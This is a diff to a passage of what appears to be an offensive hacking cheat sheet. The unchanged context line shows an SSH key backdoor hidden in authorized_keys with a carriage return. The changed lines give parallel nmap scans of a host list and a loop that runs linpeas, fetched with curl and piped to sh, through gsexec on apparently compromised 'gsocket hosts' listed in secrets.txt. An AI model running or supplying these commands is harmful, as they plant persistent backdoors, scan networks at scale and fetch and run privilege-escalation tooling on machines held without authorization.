@@ -354,16 +354,16 @@ echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >a
 
 Note: The same can be achieved with [parallel](https://www.gnu.org/software/parallel/parallel_tutorial.html).
 
-Scan hosts in 20 parallel tasks:
+Scan hosts with 20 parallel tasks:
 ```sh
 cat hosts.txt | xargs -P20 -I{} --process-slot-var=SLOT bash -c 'exec nmap -n -Pn -sV -F --open -oG - {} >>"nmap_${SLOT}.txt"'
 ```
-- Use `exec` to replace the underlying shell with the last process (nmap). It's optional but reduces the number of running shell binaries.
-- ${SLOT} contains a value between 0..19 and is the "task number". We use it to write the results into 20 separate files.
+- `exec` is used to replace the underlying shell with the last process (nmap). It's optional but reduces the number of running/useless shell binaries.
+- `${SLOT}` contains a value between 0..19. It's the "task number". We use it to write the nmap-results into 20 separate files.
 
 Execute [Linpeas](https://github.com/carlospolop/PEASS-ng) on all [gsocket](https://www.gsocket.io/deploy) hosts using 40 workers:
 ```sh
-cat secrets.txt | xargs -P40 -I{} bash -c 'mkdir host_{}; gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>>"linpeas-${SLOT}.err"'
+cat secrets.txt | xargs -P40 -I{} --process-slot-var=SLOT bash -c 'mkdir host_{}; gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>>"linpeas-${SLOT}.err"'
 ```
 - Log each result into a separate file but log all errors into a error-log file by task-number.
 
